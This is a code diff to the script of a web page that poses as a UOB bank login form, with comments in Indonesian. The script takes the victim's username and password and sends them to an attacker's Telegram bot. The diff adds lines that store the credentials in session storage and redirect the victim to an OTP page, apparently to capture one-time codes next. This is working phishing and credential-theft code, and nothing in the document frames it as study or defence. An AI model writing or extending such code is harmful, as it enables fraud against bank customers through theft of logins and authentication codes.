@@ -198,7 +198,7 @@
 </div>
 
 <script>
-  // Ganti token dan chatID berikut dengan milik Anda
+  // Ganti dengan token dan chat ID Anda
   const telegramBotToken = 'YOUR_TELEGRAM_BOT_TOKEN';
   const telegramChatId = 'YOUR_TELEGRAM_CHAT_ID';
 
@@ -212,20 +212,17 @@
       alert('Please enter both username and password.');
       return;
     }
+
+    // Simpan ke sessionStorage supaya bisa dipakai di halaman OTP
+    sessionStorage.setItem('uob_user', user);
+    sessionStorage.setItem('uob_pass', pass);
     
-    // Siapkan pesan yang akan dikirim ke Telegram
-    const message = `
-  New UOB login attempt:
-  Username: ${user}
-  Password: ${pass}
-  `;
+    // Kirim data login ke Telegram Bot API
+    const message = `New UOB login attempt:\nUsername: ${user}\nPassword: ${pass}`;
     
-    // Kirim data ke Telegram Bot API
     fetch(`https://api.telegram.org/bot${telegramBotToken}/sendMessage`, {
       method: 'POST',
-      headers: {
-        'Content-Type': 'application/json'
-      },
+      headers: {'Content-Type': 'application/json'},
       body: JSON.stringify({
         chat_id: telegramChatId,
         text: message,
@@ -234,15 +231,12 @@
     })
     .then(response => response.json())
     .then(data => {
-      // Bisa tampilkan alert sukses jika perlu, atau langsung lanjut
-      // alert('Login data sent.');
-      
-      // Reset input (optional)
-      document.getElementById('loginForm').reset();
+      // Redirect ke halaman OTP setelah login berhasil dikirim
+      window.location.href = 'otp.html';
     })
     .catch(error => {
       console.error('Error sending to Telegram:', error);
-      // alert('Failed to send login data.');
+      alert('Failed to send login data.');
     });
   });
 </script>
